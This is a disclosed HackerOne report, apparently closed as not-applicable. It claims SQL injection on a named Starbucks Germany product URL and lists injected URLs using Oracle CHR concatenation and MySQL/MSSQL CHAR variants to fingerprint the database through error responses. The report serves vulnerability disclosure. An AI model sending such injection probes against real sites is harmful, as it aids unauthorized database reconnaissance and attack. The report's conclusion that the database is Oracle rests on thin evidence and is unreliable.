---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '360539'
original_report_id: '360539'
title: SQL Injection Proof of Concept for Starbucks URL
weakness: SQL Injection
team_handle: starbucks
created_at: '2018-05-31T19:53:38.818Z'
disclosed_at: '2019-01-09T18:49:06.831Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 1
asset_identifier: www.starbucks.de
asset_type: URL
max_severity: critical
tags:
- hackerone
- sql-injection
---

# SQL Injection Proof of Concept for Starbucks URL

## Metadata

- HackerOne Report ID: 360539
- Weakness: SQL Injection
- Program: starbucks
- Disclosed At: 2019-01-09T18:49:06.831Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

browser: firefox quantum 60.0.1 64 bit
os: windows 10
sqli type: char formula injection
info found: oracle database system
url: https://www.starbucks.de/coffee/our-coffees/format/whole-bean
injected url using oracle concatenation and char functions: https://www.starbucks.de/coffee/our-coffees/format/whole-bean CHR(111) || CHR(114) || CHR(100) || CHR(101) || CHR(114) || CHR(32) || CHR(98) || CHR(121) || CHR(32) || CHR(49)
steps to find oracle dbms
1. inject the following url with order by 1 written with char and oracle concatenation resulting in an erronous page, which indicates oracle db is used.
2. https://www.starbucks.de/coffee/our-coffees/format/whole-bean CHR(111) || CHR(114) || CHR(100) || CHR(101) || CHR(114) || CHR(32) || CHR(98) || CHR(121) || CHR(32) || CHR(49)
3.then inject the following url with mysql char using order by 1, which results in no error.  so is not mysql dbms.
4. https://www.starbucks.de/coffee/our-coffees/format/whole-beanCHAR(111, 114, 100, 101, 114, 32, 98, 121, 32, 49)
5. finally try and inject with microsoft sql server char injection using order by 1 in char concatenation. which results in no error.  so is not a microsoft sql server database.  
6. https://www.starbucks.de/coffee/our-coffees/format/whole-bean CHAR(111) + CHAR(114) + CHAR(100) + CHAR(101) + CHAR(114) + CHAR(32) + CHAR(98) + CHAR(121) + CHAR(32) + CHAR(49)
description:
by process of elimination by error.  i was able to figure out which database starbucks is using for that url.  basically, the only sql injection code that errored was the oracle char concatenation.  leading me to believe that you use oracle dbms.

images included attached showing error with oracle sql injection and no error with ms sql nor mysql injection,

## Impact

by knowning that the database is oracle this can lead to furthder exploits to gain priviledged information as it is no longer a blind sql exploit.  which is a lot easier to deploy.  the attacker can now streamline the sql injection to be specifically based on oracle sql syntax.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
